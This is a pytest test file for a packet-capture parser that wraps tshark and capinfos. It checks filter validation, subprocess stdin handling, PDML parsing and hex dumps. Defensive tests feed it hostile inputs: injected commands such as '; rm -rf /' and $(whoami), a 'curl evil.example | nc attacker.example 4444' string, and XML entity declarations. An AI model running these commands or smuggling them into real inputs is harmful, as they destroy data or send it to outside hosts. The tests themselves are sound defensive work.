"""Tests for backend.packet_parser.

_validate_display_filter, ALLOWED_VIEW_FLAGS and _name_resolution_args are
pure and run anywhere, no tools required. Everything that actually shells
out to tshark/capinfos is marked pytest.mark.skipif and must show up as
SKIPPED in the report (pytest -r s), never silently vanish from the count --
a harness that prints "all passed" while quietly omitting the parser entirely
is exactly how a real regression (see CHANGELOG dev.7/dev.8, the -n/-nn
mixup) goes unnoticed for a release.
"""

from __future__ import annotations

import json
import shutil
import stat
import struct
import sys
from xml.etree import ElementTree

import pytest

from backend import packet_parser
from backend.pcapsource import PcapSource

HAS_TSHARK = shutil.which("tshark") is not None
HAS_CAPINFOS = shutil.which("capinfos") is not None

needs_tshark = pytest.mark.skipif(not HAS_TSHARK, reason="tshark is not installed in this environment")
needs_capinfos = pytest.mark.skipif(not HAS_CAPINFOS, reason="capinfos is not installed in this environment")


# --- _validate_display_filter: pure, no tools -------------------------------


@pytest.mark.parametrize(
    "benign",
    [
        "",
        "tcp",
        "tcp.port == 80",
        "ip.addr == 10.0.0.1",
        "http.request.method == \"GET\"",
        "frame.number == 42",
        "tcp.flags.syn == 1 and tcp.flags.ack == 0",
        # Wireshark's own operators. These were rejected as "forbidden
        # characters" until the rule was corrected, which meant the syntax most
        # people actually type could not be run.
        "tcp && ip",
        "http || dns",
        "!(arp or icmp)",
        "tcp.flags & 0x02",
    ],
)
def test_validate_display_filter_accepts_benign_filters(benign):
    packet_parser._validate_display_filter(benign)  # must not raise


@pytest.mark.parametrize("forbidden_char", list(";$`\\"))
def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char):
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter(f"tcp.port == 80{forbidden_char}whoami")


@pytest.mark.parametrize(
    "hostile",
    [
        "tcp.port == 80; rm -rf /",
        "tcp.port == 80`whoami`",
        "tcp.port == 80$(whoami)",
        "tcp.port == 80\\x00",
    ],
)
def test_validate_display_filter_rejects_hostile_filters(hostile):
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter(hostile)


def test_validate_display_filter_rejects_an_overlong_filter():
    with pytest.raises(packet_parser.DisplayFilterError):
        packet_parser._validate_display_filter("a" * (packet_parser._FILTER_MAX_LEN + 1))


# `&` and `|` are allowed now, and the reason has to be a property of the code
# rather than an assurance: the filter reaches tshark through
# create_subprocess_exec as one argv element, with no shell anywhere on the
# path, so shell operators in it are text that tshark will reject as bad filter
# syntax -- not commands. This asserts exactly that, without needing tshark.


async def test_a_display_filter_reaches_the_tool_as_one_argument_and_no_shell():
    hostile = "tcp.port == 80 && curl evil.example | nc attacker.example 4444"
    probe = "import sys, json; print(json.dumps(sys.argv[1:]))"
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", probe, "-Y", hostile], BytesSource(b"")
    )
    assert rc == 0
    assert json.loads(stdout) == ["-Y", hostile]


def test_filter_rejection_keeps_tsharks_message_and_drops_the_banner():
    stderr = (
        b'Running as user "root" and group "root". This could be dangerous.\n'
        b"tshark: Constant expression is invalid.\n"
        b"    tcp.porrt == 80\n"
        b"    ^~~~~~~~~~~~~~~\n"
    )
    message = packet_parser._filter_rejection(stderr)
    assert message.startswith("Constant expression is invalid.")
    assert "Running as user" not in message
    # The caret line is the part that says where the mistake is.
    assert "^~~" in message


# --- ALLOWED_VIEW_FLAGS: pure, no tools --------------------------------------


def test_allowed_view_flags_contains_exactly_the_documented_set():
    assert packet_parser.ALLOWED_VIEW_FLAGS == {"-e", "-t", "-tt", "-ttt", "-tttt", "-tz"}


def test_local_time_asks_for_epoch_seconds_not_a_formatted_time():
    """-tz renders in the reader's zone, which only the browser knows. tshark's
    frame.time is the capture host's local time -- UTC in this container -- so
    the server sends epoch seconds and the frontend formats them."""
    assert packet_parser.VIEW_FLAG_TIME_FIELD["-tz"] == "frame.time_epoch"
    assert packet_parser.VIEW_FLAG_TIME_FIELD["-tttt"] == "frame.time"


def test_allowed_view_flags_matches_the_time_field_mapping_keys():
    # every VIEW_FLAG_TIME_FIELD key must be an allowed flag, or a flag could
    # change behavior silently without being documented as allowed
    assert set(packet_parser.VIEW_FLAG_TIME_FIELD) <= packet_parser.ALLOWED_VIEW_FLAGS


# --- _name_resolution_args: pure, no tools ------------------------------------


def test_name_resolution_args_off_by_default():
    assert packet_parser._name_resolution_args(False) == ["-n"]


def test_name_resolution_args_on_enables_host_lookup_explicitly():
    args = packet_parser._name_resolution_args(True)
    assert args == [
        "-N", "mnt",
        "-o", "nameres.network_name:TRUE",
        "-o", "nameres.use_external_name_resolver:TRUE",
    ]


def test_name_resolution_args_returns_a_copy_not_the_module_constant():
    """Mutating the returned list must never corrupt the shared constant for
    the next call -- that would make one caller's cleanup affect every
    future capture view."""
    args = packet_parser._name_resolution_args(False)
    args.append("--corrupted")
    assert packet_parser._name_resolution_args(False) == ["-n"]


# --- get_packet_list: filter validation happens before any tool runs -------


class BoomSource(PcapSource):
    """Proves the display filter is rejected before any subprocess is
    spawned -- feeding this source would raise if _run_tool ever reached it."""

    async def chunks(self):
        raise AssertionError("tshark should never be invoked for an invalid filter")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


async def test_get_packet_list_rejects_hostile_filter_before_running_any_tool():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_list(
            BoomSource(), display_filter="tcp.port == 80; rm -rf /"
        )


# --- integration tests: require a real tshark/capinfos ----------------------


def _build_minimal_pcap(num_packets: int = 1) -> bytes:
    """A hand-built libpcap file: one UDP packet (10.0.0.1:12345 -> 10.0.0.2:53,
    payload b"ping"), repeated. No scapy or fixture file needed -- just enough
    bytes for tshark to parse a real capture end to end."""
    global_header = struct.pack(
        "<IHHiIII",
        0xA1B2C3D4,  # magic (little-endian, microsecond precision)
        2, 4,        # version major, minor
        0, 0,        # thiszone, sigfigs
        65535,       # snaplen
        1,           # network = LINKTYPE_ETHERNET
    )

    eth = b"\xff\xff\xff\xff\xff\xff" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
    payload = b"ping"
    udp_len = 8 + len(payload)
    udp = struct.pack(">HHHH", 12345, 53, udp_len, 0) + payload
    ip_total_len = 20 + udp_len
    ip = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + udp
    frame = eth + ip

    records = b""
    for i in range(num_packets):
        records += struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
    return global_header + records


class BytesSource(PcapSource):
    def __init__(self, data: bytes) -> None:
        self._data = data

    async def chunks(self):
        yield self._data

    async def size(self) -> int:
        return len(self._data)


@needs_tshark
async def test_get_packet_list_parses_a_real_capture():
    packets = await packet_parser.get_packet_list(BytesSource(_build_minimal_pcap()))
    assert len(packets) == 1
    assert packets[0].number == 1
    assert packets[0].source == "10.0.0.1"
    assert packets[0].destination == "10.0.0.2"


@needs_tshark
async def test_get_packet_list_applies_display_filter():
    data = _build_minimal_pcap()
    matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 53")
    assert len(matching) == 1
    none_matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 9999")
    assert len(none_matching) == 0


@needs_tshark
async def test_get_packet_list_respects_offset_and_limit():
    data = _build_minimal_pcap(num_packets=5)
    packets = await packet_parser.get_packet_list(BytesSource(data), offset=2, limit=2)
    assert [p.number for p in packets] == [3, 4]


@needs_tshark
async def test_a_filter_tshark_rejects_is_reported_not_silently_empty():
    """A mistyped field used to produce an empty list reading "No packets
    match", which is exactly what a valid filter selecting nothing looks like.
    tshark exits non-zero on a filter it cannot parse and zero when one simply
    matches nothing, so the two are distinguishable and must be told apart."""
    with pytest.raises(packet_parser.DisplayFilterError) as exc:
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()), display_filter="tcp.porrt == 80"
        )
    assert "tcp.porrt" in str(exc.value)


@needs_tshark
async def test_a_valid_filter_matching_nothing_is_an_empty_list_not_an_error():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="tcp.port == 9999"
    )
    assert packets == []


@needs_tshark
async def test_wireshark_operators_run_rather_than_being_refused():
    """`&&` and `||` are what people type. They were rejected outright before."""
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap(num_packets=2)), display_filter="udp && ip"
    )
    assert len(packets) == 2


@needs_tshark
async def test_get_packet_detail_returns_layers_and_hex_dump():
    detail = await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=1)
    assert detail.number == 1
    layer_names = {layer["name"] for layer in detail.layers}
    assert "ip" in layer_names
    assert "udp" in layer_names
    assert detail.hex_dump  # non-empty hex dump text


@needs_tshark
async def test_get_packet_detail_raises_for_missing_frame():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=999)


@needs_capinfos
async def test_get_packet_count_matches_real_capture():
    count = await packet_parser.get_packet_count(BytesSource(_build_minimal_pcap(num_packets=3)))
    assert count == 3


# --- the tool exiting before the feed finishes -----------------------------
#
# A tool that has what it needs closes its stdin and exits while chunks are
# still being written, and the write that lands after that must not be treated
# as a failure to supply the capture.


class ClosedTransportSource(PcapSource):
    """Writes once, then fails the way a closed stdin fails."""

    def __init__(self, data: bytes, error: Exception) -> None:
        self._data = data
        self._error = error

    async def chunks(self):
        yield self._data
        raise self._error

    async def size(self) -> int:
        return len(self._data)


@needs_capinfos
@pytest.mark.parametrize(
    "error",
    [BrokenPipeError(), ConnectionResetError()],
    ids=["broken-pipe", "connection-reset"],
)
async def test_get_packet_count_survives_the_tool_closing_stdin_early(error):
    count = await packet_parser.get_packet_count(
        ClosedTransportSource(_build_minimal_pcap(num_packets=3), error)
    )
    assert count == 3


# --- how the capture reaches the tool ---------------------------------------
#
# Wiretap, the library under both tshark and capinfos, accepts a regular file
# or a FIFO on stdin and rejects everything else outright:
#
#   tshark: The standard input is a "special file" or socket or other
#   non-regular file.
#
# asyncio's stdin=PIPE is a real pipe, so it passes. uvloop's is a Unix
# socketpair, so it does not -- and uvicorn[standard] selects uvloop in the
# container. Every tshark call there returned no packets and every capinfos
# call no count, for a whole release, while this suite passed on stock asyncio.
# So the assertion is about the shape of the descriptor, not about the loop:
# it holds under both, and no tool needs to be installed to check it.


async def test_run_tool_hands_the_tool_a_fifo_on_stdin_not_a_socket():
    probe = (
        "import os, stat; "
        "print('fifo' if stat.S_ISFIFO(os.fstat(0).st_mode) else 'other')"
    )
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", probe], BytesSource(b"ignored")
    )
    assert rc == 0
    assert stdout.decode().strip() == "fifo"


async def test_run_tool_closes_the_write_end_so_the_tool_sees_eof():
    """A tool that reads to EOF must terminate. Leaving the parent's copy of the
    write end open leaves it blocked on a pipe nobody will ever close again."""
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", "import sys; sys.stdout.write(sys.stdin.read())"],
        BytesSource(b"three chunks worth"),
    )
    assert rc == 0
    assert stdout == b"three chunks worth"


@needs_capinfos
async def test_get_packet_count_raises_rather_than_reporting_zero_for_a_failed_tool():
    """0 meant both "an empty capture" and "capinfos never ran", which is what
    let the socketpair failure look like a legitimately empty capture."""
    with pytest.raises(RuntimeError, match="no packet count"):
        await packet_parser.get_packet_count(BytesSource(b"not a capture file"))


class UnreadableSource(PcapSource):
    """A source that genuinely cannot be read -- not a closed pipe."""

    async def chunks(self):
        raise OSError("captures volume is not readable")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


@needs_capinfos
async def test_get_packet_count_still_fails_when_the_source_itself_breaks():
    """The pipe-closed exemption must not swallow a real read failure: output
    from a tool that was fed nothing is not a trustworthy packet count."""
    with pytest.raises(RuntimeError, match="could not supply capture data"):
        await packet_parser.get_packet_count(UnreadableSource())


# --- MAC columns on a cooked capture ------------------------------------------
#
# "tcpdump -i any" produces LINKTYPE_LINUX_SLL, which has no Ethernet header at
# all: eth.src and eth.dst are both empty on every frame. Since "any" is the
# default interface, -e showed two blank columns for most captures and read as
# a flag that did nothing.


def _build_cooked_pcap(num_packets: int = 1) -> bytes:
    """A libpcap file with LINKTYPE_LINUX_SLL (113), as `-i any` writes."""
    global_header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 113)
    sll = (
        struct.pack(">HHH", 0, 1, 6)
        + b"\x02\x00\x00\x00\x00\x01"
        + b"\x00\x00"
        + struct.pack(">H", 0x0800)
    )
    payload = b"ping"
    udp = struct.pack(">HHHH", 12345, 53, 8 + len(payload), 0) + payload
    ip = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, 20 + 8 + len(payload), 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + udp
    frame = sll + ip
    records = b"".join(
        struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
        for i in range(num_packets)
    )
    return global_header + records


def test_mac_takes_the_first_column_that_has_an_address():
    assert packet_parser._mac(["", "", "aa:bb"], 1, 2) == "aa:bb"
    assert packet_parser._mac(["", "cc:dd", "aa:bb"], 1, 2) == "cc:dd"
    assert packet_parser._mac(["", "", ""], 1, 2) == ""
    assert packet_parser._mac(["only"], 1, 2) == ""


@needs_tshark
async def test_mac_columns_are_populated_on_an_ethernet_capture():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), view_flags=["-e"]
    )
    assert packets[0].src_mac == "02:00:00:00:00:01"
    assert packets[0].dst_mac == "ff:ff:ff:ff:ff:ff"


@needs_tshark
async def test_the_source_mac_still_appears_on_an_any_interface_capture():
    """The whole point: this is what the default interface produces."""
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_cooked_pcap()), view_flags=["-e"]
    )
    assert packets[0].src_mac == "02:00:00:00:00:01"
    # A cooked header carries no destination address, so this one is honestly
    # empty rather than missing through a bug.
    assert packets[0].dst_mac == ""


@needs_tshark
async def test_mac_columns_stay_empty_when_the_flag_is_off():
    packets = await packet_parser.get_packet_list(BytesSource(_build_cooked_pcap()))
    assert packets[0].src_mac == ""
    assert packets[0].dst_mac == ""


# --- PDML parsing: pure, no tools ---------------------------------------------
#
# get_packet_detail moved from `-T json` to `-T pdml` so a field carries its own
# byte offset and length. Those two numbers are what lets a field highlight its
# bytes and a byte find its field; nothing else in the JSON output supplies
# them, so these tests pin the shape of what is parsed out.

_PDML_SAMPLE = b"""<?xml version="1.0"?>
<pdml version="0" creator="wireshark/4.2.2">
<packet>
  <proto name="geninfo" pos="0" showname="General information" size="58">
    <field name="num" pos="0" show="1" size="58"/>
  </proto>
  <proto name="frame" showname="Frame 1: 58 bytes" size="58" pos="0">
    <field name="frame.time_relative" showname="Time since reference: 0.000000000" size="0" pos="0" show="0.000000000"/>
  </proto>
  <proto name="tcp" showname="Transmission Control Protocol, Src Port: 51234" size="24" pos="34">
    <field name="tcp.srcport" showname="Source Port: 51234" size="2" pos="34" show="51234" value="c822"/>
    <field name="tcp.port" showname="Source or Destination Port: 51234" hide="yes" size="2" pos="34" show="51234" value="c822"/>
    <field name="tcp.flags" showname="Flags: 0x002 (SYN)" size="2" pos="46" show="0x0002" value="2">
      <field name="tcp.flags.syn" showname=".... .... ..1. = Syn: Set" size="1" pos="47" show="True" value="1"/>
    </field>
  </proto>
</packet>
</pdml>
"""


def test_parse_pdml_drops_geninfo():
    """PDML's own synthetic summary is not a protocol in the frame."""
    layers = packet_parser._parse_pdml(_PDML_SAMPLE)
    assert [layer["name"] for layer in layers] == ["frame", "tcp"]


def test_parse_pdml_keeps_wiresharks_own_labels():
    layers = packet_parser._parse_pdml(_PDML_SAMPLE)
    tcp = layers[1]
    assert tcp["label"] == "Transmission Control Protocol, Src Port: 51234"
    assert tcp["fields"][0]["label"] == "Source Port: 51234"


def test_parse_pdml_carries_byte_offsets():
    """The entire reason for PDML over -T json."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    srcport = tcp["fields"][0]
    assert srcport["pos"] == 34
    assert srcport["size"] == 2


def test_parse_pdml_field_name_and_value_make_a_filter():
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    srcport = tcp["fields"][0]
    assert srcport["name"] == "tcp.srcport"
    # `show`, not `value`: the filter is written against 51234, not 0xc822.
    assert srcport["value"] == "51234"


def test_parse_pdml_marks_generated_duplicates_hidden():
    """tcp.port sits beside tcp.srcport with hide="yes"; Wireshark draws neither."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    assert tcp["fields"][0]["hidden"] is False
    assert tcp["fields"][1]["name"] == "tcp.port"
    assert tcp["fields"][1]["hidden"] is True


def test_parse_pdml_nests_the_flag_bits():
    """The bit display: tshark writes the diagram, so it never has to be built."""
    tcp = packet_parser._parse_pdml(_PDML_SAMPLE)[1]
    flags = tcp["fields"][2]
    assert flags["name"] == "tcp.flags"
    syn = flags["children"][0]
    assert syn["name"] == "tcp.flags.syn"
    assert syn["label"] == ".... .... ..1. = Syn: Set"
    assert syn["pos"] == 47


def test_parse_pdml_returns_none_when_no_packet_matched():
    empty = b'<?xml version="1.0"?><pdml version="0" creator="w"></pdml>'
    assert packet_parser._parse_pdml(empty) is None


def test_parse_pdml_refuses_a_document_type_declaration():
    """A billion-laughs expansion is the one way packet bytes could attack expat."""
    hostile = b'<?xml version="1.0"?><!DOCTYPE p [<!ENTITY a "x">]><pdml><packet/></pdml>'
    with pytest.raises(ValueError, match="document type declaration"):
        packet_parser._parse_pdml(hostile)


def test_parse_pdml_rejects_malformed_xml():
    with pytest.raises(ValueError, match="could not parse"):
        packet_parser._parse_pdml(b"<pdml><packet>")


def test_int_attr_survives_a_missing_or_unparseable_value():
    element = ElementTree.fromstring('<field pos="oops"/>')
    assert packet_parser._int_attr(element, "pos") == -1
    assert packet_parser._int_attr(element, "size") == 0


# --- the hex dump is built from the bytes, not scraped from tshark ------------


def test_hex_dump_text_lays_out_offset_hex_and_ascii():
    dump = packet_parser._hex_dump_text("48656c6c6f")
    assert dump == "0000  48 65 6c 6c 6f                                   Hello"


def test_hex_dump_text_wraps_at_sixteen_bytes():
    lines = packet_parser._hex_dump_text("00" * 20).splitlines()
    assert len(lines) == 2
    assert lines[0].startswith("0000  ")
    assert lines[1].startswith("0010  ")


def test_hex_dump_text_renders_unprintable_bytes_as_dots():
    assert packet_parser._hex_dump_text("00ff41").endswith("..A")


def test_hex_dump_text_of_nothing_is_nothing():
    assert packet_parser._hex_dump_text("") == ""


@needs_tshark
async def test_get_packet_detail_reports_offsets_and_frame_bytes():
    """End to end: the two things the viewer cannot render without."""
    detail = await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), 1)
    assert detail.frame_hex
    assert len(detail.frame_hex) % 2 == 0
    every_field = []

    def walk(fields):
        for field in fields:
            every_field.append(field)
            walk(field.get("children") or [])

    for layer in detail.layers:
        walk(layer["fields"])
    assert any(f["pos"] >= 0 and f["size"] > 0 for f in every_field)
    # Every offset a field claims has to exist in the bytes the viewer renders.
    frame_len = len(detail.frame_hex) // 2
    for field in every_field:
        if field["pos"] >= 0 and field["size"] > 0:
            assert field["pos"] + field["size"] <= frame_len


@needs_tshark
async def test_get_packet_detail_rejects_a_frame_that_is_not_there():
    with pytest.raises(ValueError, match="not found"):
        await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), 99)


# --- the rule click-to-filter is built on ------------------------------------
#
# The viewer turns a clicked field into `name == value`, and has to decide
# whether to quote the value. Addresses are literals in Wireshark's syntax and
# quoting one is a type error, not a string comparison -- the whole expression
# is rejected. That rule lives in the frontend (isBareLiteral in app.js), which
# the Python suite cannot execute, so what is pinned here is the tshark
# behaviour the rule exists to satisfy. If this ever stops being true, the
# frontend's quoting is wrong too.


@needs_tshark
async def test_an_address_literal_is_accepted_unquoted():
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="ip.addr == 192.168.1.1"
    )
    assert isinstance(packets, list)


@needs_tshark
async def test_a_quoted_address_is_rejected():
    """The bug this pins: quoting every non-numeric value broke every address filter."""
    with pytest.raises(packet_parser.DisplayFilterError):
        await packet_parser.get_packet_list(
            BytesSource(_build_minimal_pcap()), display_filter='ip.addr == "192.168.1.1"'
        )


@needs_tshark
async def test_a_boolean_flag_filters_on_one():
    """PDML reports a flag as show="True"; the viewer writes == 1.

    tshark 4.2 happens to accept == True as well, so this is a canonical-form
    choice rather than a correctness fix: 1 and 0 are what Wireshark itself puts
    in the filter bar, and what older and newer tshark both take.
    """
    packets = await packet_parser.get_packet_list(
        BytesSource(_build_minimal_pcap()), display_filter="tcp.flags.syn == 1"
    )
    assert isinstance(packets, list)


def test_parse_pdml_refuses_a_lowercase_doctype_too():
    """XML only allows the uppercase form; not depending on that costs nothing."""
    hostile = b'<?xml version="1.0"?><!doctype p [<!entity a "x">]><pdml><packet/></pdml>'
    with pytest.raises(ValueError, match="document type declaration"):
        packet_parser._parse_pdml(hostile)
